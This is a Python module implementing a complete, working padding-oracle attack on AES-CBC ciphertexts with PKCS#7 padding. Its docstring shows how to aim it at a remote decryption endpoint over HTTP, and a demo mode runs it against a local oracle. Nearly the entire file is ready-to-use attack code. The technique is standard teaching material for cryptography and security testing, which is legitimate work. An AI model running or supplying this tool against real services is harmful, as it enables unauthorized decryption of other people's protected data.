#!/usr/bin/env python3
"""cbc_padding_oracle.py — generic PKCS#7 padding-oracle attack against any
oracle that distinguishes "padding valid" from "padding invalid".

Usage
-----
Import the ``attack`` function and pass it:

* ``oracle(ct: bytes) -> bool`` — returns ``True`` iff the ciphertext decrypts
  to something with valid PKCS#7 padding.
* ``ct: bytes`` — full ciphertext including the IV as its first block.
* ``block_size: int`` — usually ``16`` for AES.

Example::

    import requests
    from cbc_padding_oracle import attack

    def oracle(ct: bytes) -> bool:
        r = requests.post("http://target/decrypt", data={"ct": ct.hex()})
        return r.status_code == 200

    iv_and_ct = bytes.fromhex("...")
    print(attack(oracle, iv_and_ct))

Or run as a script with a ``--demo`` flag to attack a local AES-CBC oracle
just to confirm the implementation works on your machine.
"""
from __future__ import annotations

import os
from typing import Callable

Oracle = Callable[[bytes], bool]


def attack_block(oracle: Oracle, prev: bytes, target: bytes, bs: int) -> bytes:
    """Recover the plaintext of a single block ``target`` given the preceding
    block ``prev``."""
    intermediate = bytearray(bs)
    for byte_index in range(bs - 1, -1, -1):
        pad = bs - byte_index
        for guess in range(256):
            forged = bytearray(bs)
            for k in range(byte_index + 1, bs):
                forged[k] = intermediate[k] ^ pad
            forged[byte_index] = guess
            if oracle(bytes(forged) + target):
                # Edge case on the final byte: a valid \x01 pad is always
                # legal regardless of underlying byte. Tweak the previous
                # byte to disambiguate.
                if byte_index == bs - 1:
                    probe = bytearray(forged)
                    probe[byte_index - 1] ^= 0x01
                    if not oracle(bytes(probe) + target):
                        continue
                intermediate[byte_index] = guess ^ pad
                break
        else:
            raise RuntimeError(f"no candidate at byte {byte_index}")
    return bytes(p ^ i for p, i in zip(prev, intermediate))


def attack(oracle: Oracle, ct: bytes, bs: int = 16) -> bytes:
    """Recover the full plaintext. ``ct`` must include the IV as block 0."""
    if len(ct) % bs:
        raise ValueError("ciphertext length not a multiple of block size")
    blocks = [ct[i:i + bs] for i in range(0, len(ct), bs)]
    pt = b""
    for i in range(1, len(blocks)):
        pt += attack_block(oracle, blocks[i - 1], blocks[i], bs)
    return pt


def _demo() -> None:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad

    key = os.urandom(16)
    iv = os.urandom(16)
    msg = b"squeamish ossifrage at dawn"
    ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(msg, 16))

    def oracle(blob: bytes) -> bool:
        try:
            unpad(AES.new(key, AES.MODE_CBC, blob[:16]).decrypt(blob[16:]), 16)
            return True
        except ValueError:
            return False

    recovered = attack(oracle, iv + ct, 16)
    print(recovered)


if __name__ == "__main__":
    import sys
    if len(sys.argv) == 2 and sys.argv[1] == "--demo":
        _demo()
    else:
        sys.exit("Import the `attack` function from this module, or run with --demo.")
